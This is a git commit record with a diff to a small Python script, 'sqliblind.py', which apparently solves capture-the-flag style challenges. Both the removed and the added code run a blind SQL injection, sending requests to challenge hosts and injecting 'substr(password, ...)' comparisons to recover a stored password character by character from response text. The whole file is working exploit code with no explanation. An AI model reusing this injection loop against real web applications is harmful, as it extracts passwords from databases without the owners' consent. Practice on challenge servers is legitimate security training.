a084497e3a76899c55b715fbe1452df72caa864e
g3zb0yy <b0d3ns33@criminal.li>
2021-02-17 16:14:43 +0100

    Update sqliblind.py

--- sqliblind.py
+++ sqliblind.py
@@ -2,12 +2,18 @@ import requests
 
 def main():
     try:
+        allinone = []
+        num = [str(i) for i in range(0, 10)]
         alpha = [chr(i) for i in range(ord('a'), ord('z') + 1)]
-        for a in alpha:
-            for b in range(1, 12):
-                r = requests.get("http://chall.voilixa.ml/chall/blind.php", data={"reponse":"oui' and substr(password, " + str(b) + ", 1)='" + a + "'-- -"})
-                if "trop bien" in r.text:
-                    print(a)
+        for a in num:
+            allinone.append(a)
+        for b in alpha:
+            allinone.append(b)
+        for i in range(0, 20):
+            for x in allinone:
+                r = requests.get("http://toronto.alwaysdata.net/blind/blind.php?id=1 and (select substr(password, " + str(i) + ", 1)=0x" + x.encode("utf-8").hex() + ")")
+                if "Utilisateur existant." in r.text:
+                    print(x)
     except:
         pass
 main()
